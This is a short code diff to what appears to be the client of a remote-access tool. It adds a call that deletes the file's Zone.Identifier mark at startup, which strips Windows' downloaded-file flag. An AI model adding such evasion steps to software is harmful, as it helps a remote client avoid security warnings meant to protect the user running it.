@@ -133,6 +133,8 @@ namespace xClient
             if (ClientData.Disconnect)
                 return;
 
+            FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
+
             if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
             {
                 WindowsAccountHelper.StartUserIdleCheckThread();
